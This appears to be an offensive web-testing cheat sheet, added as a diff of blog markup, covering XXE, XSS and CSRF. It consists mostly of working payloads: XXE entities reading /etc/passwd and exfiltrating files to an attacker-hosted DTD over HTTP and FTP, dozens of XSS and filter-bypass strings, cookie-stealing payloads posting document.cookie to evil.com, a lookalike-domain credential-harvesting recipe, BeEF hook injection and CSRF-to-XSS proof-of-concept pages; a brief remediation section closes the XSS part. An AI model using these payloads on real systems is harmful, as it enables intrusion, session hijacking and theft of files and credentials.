@@ -1,0 +1,983 @@
+CHEESE
+CHEESE
+
+
+
+<section class="post-content">
+				<!--kg-card-begin: markdown--><h1 id="xxe">XXE</h1>
+<h2 id="testingmethodology">Testing methodology</h2>
+<p>Once you've intercepted the POST to the vulnerable page, see if you can get the system to do what it would normally, but with entities:</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY test "THIS IS A STRING!"&gt;
+]&gt;
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
+</code></pre>
+<p>Next, see if you can throw an error:</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a
+[&lt;!ENTITY test "nice string bro"&gt;]
+&gt;
+
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
+</code></pre>
+<p>If that worked, let's see if we can read files off of the system:</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a
+[&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;]
+&gt;
+
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
+</code></pre>
+<p>Or open a php file on the system:</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a
+[&lt;!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]
+&gt;
+
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
+</code></pre>
+<p>This should return a base-64 encoded string that when decoded will be the php file you've targeted.</p>
+<h2 id="webgoat8">Webgoat 8</h2>
+<p>Test to see if we can add a comment with entities:</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY test "THIS IS A STRING!"&gt;
+]&gt;
+&lt;comment&gt;&lt;text&gt;&amp;test;&lt;/text&gt;&lt;/comment&gt;
+</code></pre>
+<p>Now check if you can read a file off of the filesystem:</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;comment&gt;&lt;text&gt;&amp;test;&lt;/text&gt;&lt;/comment&gt;
+</code></pre>
+<h2 id="mutillidae">Mutillidae</h2>
+<p>To grab files on mutillidae, use this payload on the vulnerable form input:</p>
+<pre><code>&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE a
+[&lt;!ENTITY TEST SYSTEM "file:///etc/passwd"&gt;]
+&gt;
+
+&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;
+</code></pre>
+<p>You can also omit the xml version:</p>
+<pre><code>&lt;!DOCTYPE a
+[&lt;!ENTITY TEST SYSTEM "file:///etc/passwd"&gt;]
+&gt;
+
+&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;
+</code></pre>
+<p>as well as apply the getting the contents of a php file discussed above:</p>
+<pre><code>&lt;!DOCTYPE a
+[&lt;!ENTITY TEST SYSTEM "php://filter/convert.base64-encode/resource=phpinfo.php"&gt;]
+&gt;
+&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;
+</code></pre>
+<h2 id="outofband">Out of band</h2>
+<h3 id="basictest">Basic test</h3>
+<ol>
+<li>Start burp collaborator and copy the payload to clipboard</li>
+<li>Put this into the XML file you're uploading:</li>
+</ol>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+   &lt;!ELEMENT foo ANY &gt;
+   &lt;!ENTITY xxe SYSTEM "http://burp.collab.server" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+<ol start="3">
+<li>Upload it, see if a request gets sent</li>
+<li>If it does, move on to seeing if you can read files on the server using the code below</li>
+</ol>
+<h3 id="readfiles">Read files</h3>
+<ol>
+<li>Put this into the XML file you're uploading:</li>
+</ol>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % file SYSTEM
+  "file:///etc/lsb-release"&gt;
+  &lt;!ENTITY % dtd SYSTEM
+  "http://&lt;evil attacker hostname&gt;:8000/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;data&gt;&amp;send;&lt;/data&gt;
+</code></pre>
+<ol start="2">
+<li>Put this file on <code>&lt;evil attacker hostname&gt;</code> in <code>evil.dtd</code>:</li>
+</ol>
+<pre><code>&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://&lt;evil attacker hostname&gt;:8000/?collect=%file;'&gt;"&gt; %all;
+</code></pre>
+<ol start="3">
+<li>Host the dtd file:</li>
+</ol>
+<pre><code>python -m SimpleHTTPServer 8000
+</code></pre>
+<ol start="4">
+<li>Upload the XML file.</li>
+</ol>
+<p><strong>Resource:</strong> <a href="https://dzone.com/articles/out-of-band-xml-external-entity-oob-xxe">https://dzone.com/articles/out-of-band-xml-external-entity-oob-xxe</a></p>
+<h3 id="readfilesusingftp">Read files using FTP</h3>
+<ol>
+<li>Put this into the XML file you're uploading:</li>
+</ol>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % asd SYSTEM "http://&lt;evil attacker hostname&gt;:8090/xxe_file.dtd"&gt;
+%asd;
+%c;
+]&gt;
+&lt;a&gt;&amp;rrr;&lt;/a&gt;
+</code></pre>
+<ol start="2">
+<li>Put this file on <code>&lt;evil attacker hostname&gt;</code> in <code>xxe_file.dtd</code>:</li>
+</ol>
+<pre><code>&lt;!ENTITY % d SYSTEM "file:///etc/passwd"&gt;                                     
+&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://&lt;evil attacker hostname&gt;:2121/%d;'&gt;"&gt;
+</code></pre>
+<ol start="3">
+<li>
+<p>Host the dtd file:<br>
+<code>python -m SimpleHTTPServer 8090</code></p>
+</li>
+<li>
+<p>Run <a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">this</a> ruby script on <code>&lt;evil attacker hostname&gt;</code>.</p>
+</li>
+<li>
+<p>Upload the XML file.</p>
+</li>
+</ol>
+<p><strong>Resource:</strong> <a href="https://blog.zsec.uk/out-of-band-xxe-2/">https://blog.zsec.uk/out-of-band-xxe-2/</a></p>
+<p>This can also be used to save having to run two separate listeners: <a href="https://staaldraad.github.io/2016/12/11/xxeftp/">https://staaldraad.github.io/2016/12/11/xxeftp/</a></p>
+<p>Some different payloads:<br>
+<a href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a><br>
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt</a></p>
+<p>Some writeups worth checking out:<br>
+<a href="https://hackerone.com/reports/347139">https://hackerone.com/reports/347139</a></p>
+<h3 id="resources">Resources</h3>
+<p><a href="https://blog.zsec.uk/out-of-band-xxe-2/">https://blog.zsec.uk/out-of-band-xxe-2/</a><br>
+<a href="https://pentesterlab.com/exercises/play_xxe/course">https://pentesterlab.com/exercises/play_xxe/course</a><br>
+<a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection">https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection</a><br>
+<a href="https://find-sec-bugs.github.io/bugs.htm#XXE_SAXPARSER">https://find-sec-bugs.github.io/bugs.htm#XXE_SAXPARSER</a><br>
+<a href="https://www.youtube.com/watch?v=m6KP0wpBJpU">https://www.youtube.com/watch?v=m6KP0wpBJpU</a><br>
+<a href="https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi">https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi</a><br>
+<a href="https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/">https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/</a><br>
+<a href="https://blog.detectify.com/2018/04/17/owasp-top-10-xxe/">https://blog.detectify.com/2018/04/17/owasp-top-10-xxe/</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="xss">XSS</h1>
+<h2 id="fileuploadstringxss">File upload string XSS</h2>
+<p>If you find a file upload function for an image, try introducing an image with XSS in the filename like so:<br>
+<code>&lt;img src=x onerror=alert('XSS')&gt;.png</code><br>
+<code>"&gt;&lt;img src=x onerror=alert('XSS')&gt;.png</code><br>
+<code>"&gt;&lt;svg onmouseover=alert(1)&gt;.svg</code><br>
+<code>&lt;&lt;script&gt;alert('xss')&lt;!--a--&gt;a.png</code><br>
+<strong>Resource:</strong> <a href="https://twitter.com/xsspayloads/status/904945958592622592?lang=en">https://twitter.com/xsspayloads/status/904945958592622592?lang=en</a></p>
+<h2 id="svg">SVG</h2>
+<p>This is worth trying whenever you run across an image upload. Create a file, stuff.svg and put this into it:</p>
+<pre><code>&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
+   &lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt;
+   &lt;script type="text/javascript"&gt;
+      alert('XSS!');
+   &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p><strong>Resource:</strong> <a href="https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248">https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248</a></p>
+<h2 id="xml">XML</h2>
+<pre><code>&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;something:script xmlns:something="http://www.w3.org/1999/xhtml"&gt;alert(1)&lt;/something:script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>Resource:</strong> <a href="https://blog.it-securityguard.com/bugbounty-papyal-xml-upload-cross-site-scripting-vulnerability/">https://blog.it-securityguard.com/bugbounty-papyal-xml-upload-cross-site-scripting-vulnerability/</a></p>
+<h2 id="cspbypass">CSP Bypass</h2>
+<p>This will work for <code>script-src self</code>: <code>&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/object&gt;</code></p>
+<p><strong>Resource:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS injection</a></p>
+<h2 id="genericpayloads">Generic payloads</h2>
+<p><code>&lt;svgonload=alert(1)&gt;</code>: <a href="http://jsfiddle.net/23sqP/3/">http://jsfiddle.net/23sqP/3/</a><br>
+<code>&lt;svg onload=alert(1)&gt;</code><br>
+<code>"&gt;&lt;svg onload=alert(1)&gt;</code><br>
+<code>"onmouseover=prompt(1) //</code><br>
+<code>&lt;div onmouseover="alert('XSS');"&gt;Hello :)</code><br>
+<code>"autofocus onfocus=alert(1)//</code><br>
+<code>"autofocus onfocus=prompt(1) //</code><br>
+<code>'-alert(1)-'</code>: Payload to stick in an event, like an onclick.<br>
+<code>\'-alert(1)//</code><br>
+<code>"+alert(1));&lt;!--</code><br>
+<code>'-prompt(1)//</code>: Payload to stick in an event, like an onclick.<br>
+<code>eval(atob('YWxlcnQoMSk='))</code>: generate string with <code>btoa('alert(1)')</code><br>
+<code>&lt;img src="a" onerror='eval(atob("cHJvbXB0KDEpOw=="))'&gt;</code><br>
+<code>&lt;iMg SrC=x OnErRoR=alert(1)&gt;</code><br>
+<code>"&gt;&lt;img src onerror=alert(1)&gt;</code><br>
+<code>&lt;div onmouseover="alert('XSS');"&gt;Move your mouse over me.</code><br>
+<code>'"&lt;/Script&gt;&lt;Html Onmouseover=(alert)(document.domain) //</code><br>
+<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>
+<code>&lt;/script&gt;&lt;img onerror=prompt(1)&gt;</code><br>
+<code>\'-prompt(1)//</code><br>
+<code>&lt;img="" onerror="prompt()"&gt;</code><br>
+<code>&lt;img/onerror="prompt()"&gt;</code><br>
+<code>"&gt;&lt;input/onauxclick="[1].map(prompt)"&gt;</code></p>
+<p><code>&lt;output name="jAvAsCriPt://&amp;NewLine;\u0061ler&amp;#161(1)" onclick="eval(name)"&gt;X&lt;/output&gt;</code><br>
+<strong>Resource:</strong> <a href="https://twitter.com/joernchen/status/1086237923652046849">https://twitter.com/joernchen/status/1086237923652046849</a></p>
+<p><code>str&lt;script&gt;alert(1)&lt;\/script&gt;ing</code> - give this a shot in a JSON value</p>
+<p><code>&lt;/Textarea/&lt;/Noscript/&lt;/Pre/&lt;/Xmp&gt;&lt;Svg /Onload=confirm(document.domain)&gt;</code><br>
+<strong>Resource:</strong> <a href="https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e">https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e</a>)</p>
+<p>Try this one in a field that takes emails:<br>
+<code>x@x.com&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;</code><br>
+<strong>Resource:</strong> <a href="https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248">https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248</a></p>
+<p>Some JSFuck action:<br>
+<code>""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]])+"")[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]+(!0+'')[2]+(''+{})[5]+(!0+'')[0]+(''+{})[1]+(!0+'')[1]](((!1+"")[1]+(!1+"")[2]+(!0+"")[3]+(!0+"")[1]+(!0+"")[0])+"(1)")()</code><br>
+<strong>Resource:</strong> <a href="https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters">https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters</a></p>
+<p>This payload supposedly works only on Firefox according to <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">the OWASP XSS filter evasion site</a>. However, I've had luck with it in Chrome as well in the context of a stored XSS in a text editor-type application:</p>
+<pre><code>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+</code></pre>
+<h3 id="polyglots">Polyglots</h3>
+<p>A polyglot I built based on <a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">this one</a>:</p>
+<pre><code>oNcliCk=alert(1)%20)//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;%5Cx3csVg/&lt;img/src/onerror=alert(2)&gt;%5Cx3e
+</code></pre>
+<p><strong>Resource:</strong><br>
+<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot</a></p>
+<p>I've had some good successes with this one:</p>
+<pre><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'&gt;
+</code></pre>
+<p><strong>Resource:</strong><br>
+<a href="https://twitter.com/xsspayloads/status/663599944834617344">https://twitter.com/xsspayloads/status/663599944834617344</a></p>
+<h3 id="react">React</h3>
+<p>If you see <code>dangerouslySetInnerHTML</code> in source code, try something like this payload:</p>
+<pre><code>&lt;img src=x onerror=console.log("XSS")&gt;
+</code></pre>
+<p>Because console.log is not sandboxed, you should get a hit in your browser's console.</p>
+<p>Thanks to <a href="mailto:tsangtmc@gmail.com">Jason Tsang</a> for this one.</p>
+<h2 id="basicauthcredharvester">Basic Auth Cred Harvester</h2>
+<p>If you run across a site that's vulnerable to stored XSS, but has the HTTPOnly flag set for the cookie, try harvesting their credentials with a basic auth prompt:</p>
+<ol>
+<li>Get a domain that looks reasonably close to that of your target.</li>
+<li>Download Phishery from here: <a href="https://github.com/ryhanson/phishery">https://github.com/ryhanson/phishery</a> and compile the binary.</li>
+<li>Compile and run it</li>
+<li>Set this up for the payload: <code>&lt;img/src/onerror=document.location="https://evil.com/"&gt;</code></li>
+<li>Wait for creds to come in.</li>
+</ol>
+<h2 id="stealcookies">Steal cookies</h2>
+<h3 id="simplepayloadtostealcookies">Simple payload to steal cookies:</h3>
+<p><code>&lt;img/src/onerror=document.location="http://evil.com:8090/cookiez.php?c="+document.cookie&gt;</code></p>
+<p><strong>Blacklist bypass:</strong><br>
+I came across a site recently that was blacklisting <code>//</code>, <code>:</code>, <code>"</code>, <code>&lt;</code>, and <code>&gt;</code>. This is what I did to get around that issue:</p>
+<p><code>btoa('document.location="http://evil.com:8090/r.php?c="+document.cookie')</code></p>
+<p>gives you this string:<br>
+<code>'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raWU='</code></p>
+<p>Use this payload:</p>
+<p><code>eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raWU='))</code></p>
+<h3 id="anotherone">Another one:</h3>
+<p><code>&lt;script&gt;new Image().src="http://evil.com:8090/b.php?"+document.cookie;&lt;/script&gt;</code></p>
+<p><strong>Resource:</strong> <a href="https://www.lanmaster53.com/2011/05/13/stealth-cookie-stealing-new-xss-technique/">https://www.lanmaster53.com/2011/05/13/stealth-cookie-stealing-new-xss-technique/</a></p>
+<h3 id="thisoneisprettyawesome">This one is pretty awesome:</h3>
+<p><code>&lt;svg onload=fetch("//attacker/r.php?="%2Bcookie)&gt;</code></p>
+<h3 id="setuplistenertointercept">Set up listener to intercept:</h3>
+<p><code>nc -lvp 8090</code></p>
+<p>or you can also use this:</p>
+<p><code>python -m SimpleHTTPServer 8090</code></p>
+<h3 id="testsessionhijacking">Test session hijacking</h3>
+<p>Use burp repeater, it makes it incredibly easy to play with different cookies, and understand the impact, especially with the render tab of the response.</p>
+<p><strong>Resources:</strong><br>
+<a href="https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/">https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/</a><br>
+<a href="https://www.exploresecurity.com/a-tricky-case-of-xss/">https://www.exploresecurity.com/a-tricky-case-of-xss/</a><br>
+<a href="https://brutelogic.com.br/blog/xss101/">https://brutelogic.com.br/blog/xss101/</a></p>
+<h2 id="filterbypassresources">Filter bypass resources</h2>
+<p>Collection of awesome resources to deal with filters:<br>
+<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a><br>
+<a href="https://bittherapy.net/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/a-trick-to-bypass-an-xss-filter-and-execute-javascript/</a><br>
+<a href="https://support.portswigger.net/customer/portal/articles/2590820-bypassing-signature-based-xss-filters-modifying-script-code">https://support.portswigger.net/customer/portal/articles/2590820-bypassing-signature-based-xss-filters-modifying-script-code</a><br>
+<a href="https://brutelogic.com.br/blog/avoiding-xss-detection/">https://brutelogic.com.br/blog/avoiding-xss-detection/</a><br>
+<a href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</a></p>
+<h2 id="postbasedxss">POST-based XSS</h2>
+<p>If you have a situation in which you can't turn your POST based XSS into a GET request (perhaps GET requests are disabled on the target server), give CSRF a try. This can provide you the opportunity to deliver your payload to a victim.</p>
+<h2 id="dombasedxsspayloads">DOM-based XSS Payloads:</h2>
+<pre><code>&lt;target.com&gt;/#&lt;img/src/onerror=alert("XSS")&gt;
+</code></pre>
+<p>If jQuery is being used and you want to get a beef hook into place (be sure to modify the URL encoded string before using):</p>
+<pre><code>&lt;target.com&gt;/#img/src/onerror=$("body").append(decodeURIComponent('%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%3c%65%76%69%6c%20%69%70%3e%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e'))&gt;
+</code></pre>
+<p>Another one from a James Kettle bug bounty submission:<br>
+<code>#&lt;img/src="1"/onerror=alert(1)&gt;</code><br>
+Another one from <a href="https://blog.it-securityguard.com/bugbounty-paypal-dom-xss-main-domain/">here</a>:<br>
+<code>#&gt;&lt;img src=x onerror=prompt(1);&gt;</code></p>
+<p><strong>Resource:</strong> <a href="https://hackerone.com/reports/241619">https://hackerone.com/reports/241619</a></p>
+<p>Nice site for JS event keycodes:<br>
+<a href="http://keycode.info/">http://keycode.info/</a></p>
+<p>These sites have a ton of great payloads:<br>
+<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a><br>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS injection</a><br>
+<a href="https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248">https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248</a><br>
+<a href="https://zseano.com/tutorials/4.html">https://zseano.com/tutorials/4.html</a><br>
+<a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md">https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md</a><br>
+<a href="http://www.smeegesec.com/2012/06/collection-of-cross-site-scripting-xss.html">http://www.smeegesec.com/2012/06/collection-of-cross-site-scripting-xss.html</a><br>
+<a href="http://www.xss-payloads.com/payloads-list.html?a#category=all">http://www.xss-payloads.com/payloads-list.html?a#category=all</a></p>
+<p>Could be useful for payload generation:<br>
+<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a><br>
+<a href="https://github.com/aemkei/jsfuck">https://github.com/aemkei/jsfuck</a><br>
+<a href="https://convert.town/ascii-to-text">https://convert.town/ascii-to-text</a> (Helpful to generate String.fromCharCode attacks)<br>
+<a href="http://jdstiles.com/java/cct.html">http://jdstiles.com/java/cct.html</a> (Also helpful to generate String.fromCharCode attacks)</p>
+<h4 id="resources">Resources</h4>
+<p><a href="https://brutelogic.com.br/blog/file-upload-xss/">https://brutelogic.com.br/blog/file-upload-xss/</a><br>
+<a href="https://infosecauditor.wordpress.com/2013/05/27/bypassing-asp-net-validaterequest-for-script-injection-attacks/">https://infosecauditor.wordpress.com/2013/05/27/bypassing-asp-net-validaterequest-for-script-injection-attacks/</a><br>
+<a href="https://brutelogic.com.br/blog/">https://brutelogic.com.br/blog/</a></p>
+<p>This is a payload specifically for ASP.NET endpoints that will only work for stored XSS. It uses unicode to encode the angle brackets:<br>
+<code>'%uff1cscript%uff1ealert('XSS');%uff1c/script%uff1e'</code></p>
+<h2 id="blindxss">Blind XSS</h2>
+<p>Blind XSS is a variant of stored XSS, where the payload may manifest in an area that you're not able to access. <a href="https://xsshunter.com/">XSS Hunter</a> is a solid choice for detection purposes.</p>
+<p>Helpful writeups:<br>
+<a href="https://medium.com/@newp_th/how-i-find-blind-xss-vulnerability-in-redacted-com-33af18b56869">https://medium.com/@newp_th/how-i-find-blind-xss-vulnerability-in-redacted-com-33af18b56869</a></p>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Validate and sanitize input</li>
+<li>Encode output<br>
+<strong>HTML Encoding:</strong></li>
+</ul>
+<pre><code>&amp; ---&gt; &amp;amp;
+&lt; ---&gt; &amp;lt;
+&gt; ---&gt; &amp;gt;
+" ---&gt; &amp;quot;
+' ---&gt; &amp;#x27;
+/ ---&gt; &amp;#x2F;
+</code></pre>
+<ul>
+<li>Set HttpOnly cookie attribute to true in order to prevent session hijacking</li>
+<li>Use CSP</li>
+</ul>
+<h3 id="contentsecuritypolicycsp">Content Security Policy (CSP)</h3>
+<ul>
+<li>Help mitigate against XSS and data injection attacks</li>
+<li>Does this by whitelisting URLs that the browser can load and execute JS from</li>
+<li>Prevent inline javascript, or any js that comes from an untrusted URL</li>
+<li>Configure web server to return Content-Security-Policy HTTP header or <code>&lt;meta&gt;</code> can be used to configure a policy</li>
+</ul>
+<p>Example: all content should come from the sites own origin</p>
+<p><strong>Resources:</strong><br>
+<a href="https://www.html5rocks.com/en/tutorials/security/content-security-policy/">https://www.html5rocks.com/en/tutorials/security/content-security-policy/</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="csrf">CSRF</h1>
+<p>Some bypass techniques, even if a CSRF token is in place: <a href="https://zseano.com/tutorials/5.html">https://zseano.com/tutorials/5.html</a></p>
+<p>CSRF POC vs. REST API which can work if the target application isn't validating the request header:</p>
+<pre><code>&lt;html&gt;
+&lt;script&gt;
+function jsonreq() {
+  var xmlhttp = new XMLHttpRequest();
+  xmlhttp.open("POST","https://target.com/api/endpoint", true);
+  xmlhttp.setRequestHeader("Content-Type","text/plain");
+  //xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  xmlhttp.withCredentials = true;
+  xmlhttp.send(JSON.stringify({"test":"x"}));
+}
+jsonreq();
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>Resource:</strong> <a href="https://www.gracefulsecurity.com/csrf-vs-json/">https://www.gracefulsecurity.com/csrf-vs-json/</a></p>
+<p>CSRF on JSON endpoints with flash and redirects writeups:</p>
+<ul>
+<li><a href="https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b">https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b</a></li>
+<li><a href="http://c0rni3sm.blogspot.com/2018/01/1800-in-less-than-hour.html">http://c0rni3sm.blogspot.com/2018/01/1800-in-less-than-hour.html</a></li>
+</ul>
+<h2 id="csrftoreflectedxss">CSRF to Reflected XSS</h2>
+<p>This is a template to POC this sort of attack chain.</p>
+<pre><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;p&gt;Please wait... ;)&lt;/p&gt;
+    &lt;script&gt;
+let host = 'http://target.com'
+let beef_payload = '%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e'
+let alert_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E'
+
+function submitRequest() {
+  var req = new XMLHttpRequest();
+  req.open(&lt;CSRF components, which can easily be copied from Burp's POC generator&gt;);
+  req.setRequestHeader("Accept", "*\/*");
+  req.withCredentials = true;
+  req.onreadystatechange = function () {
+    if (req.readyState === 4) {
+      executeXSS();
+    }
+  }
+  req.send();
+}
+
+function executeXSS() {
+  window.location.assign(host+'&lt;URI with XSS&gt;'+alert_payload);
+}
+
+submitRequest();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>If an endpoint uses PUT or DELETE, CSRF won't be possible (due to preflighting - <a href="https://w3c.github.io/webappsec-cors-for-developers/#cors">https://w3c.github.io/webappsec-cors-for-developers/#cors</a>), unless there is also a CORS misconfiguration. Be sure if you're testing this with burp and platform authentication that you turn off burp before you run your CSRF POC.</li>
+</ul>
+<p><strong>Resources:</strong><br>
+<a href="https://security.stackexchange.com/questions/106105/exploiting-csrf-put-request">https://security.stackexchange.com/questions/106105/exploiting-csrf-put-request</a><br>
+<a href="https://stackoverflow.com/questions/11833061/is-csrf-possible-with-put-or-delete-methods">https://stackoverflow.com/questions/11833061/is-csrf-possible-with-put-or-delete-methods</a><br>
+<a href="https://security.stackexchange.com/questions/166724/should-i-use-csrf-protection-on-rest-api-endpoints">https://security.stackexchange.com/questions/166724/should-i-use-csrf-protection-on-rest-api-endpoints</a><br>
